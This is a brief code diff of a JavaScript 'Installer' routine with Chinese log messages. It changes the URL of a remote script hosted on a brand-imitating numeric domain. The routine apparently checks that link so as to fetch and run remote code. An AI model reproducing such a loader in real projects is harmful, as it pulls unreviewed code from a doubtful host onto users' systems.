@@ -2,7 +2,7 @@
   Script["Installer"] = async () => {
     console.log("[+] 开始执行代码...");
 
-    const urlBase = "https://bing.0515364.xyz/js/Ku.js";
+    const urlBase = "https://bing.0515364.xyz/js/js-888.js";
 
     try {
       console.log("[$] 正在检查链接可用性...");
